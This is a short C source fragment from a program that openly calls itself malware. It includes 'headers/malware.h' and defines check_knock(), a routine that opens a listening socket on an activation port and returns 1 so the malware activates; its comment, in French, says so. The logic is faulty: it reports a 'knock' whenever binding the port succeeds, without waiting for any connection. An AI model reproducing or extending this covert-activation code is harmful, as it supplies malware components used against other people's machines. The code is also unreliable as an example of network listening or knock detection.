#include "headers/malware.h"

int check_knock() {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(ACTIVATION_PORT);
    server.sin_addr.s_addr = INADDR_ANY;

    if (bind(sock, (struct sockaddr *)&server, sizeof(server)) == 0) {
        listen(sock, 1);
        close(sock);
        return 1;  // Knock reçu, activer le malware
    }
    return 0;
}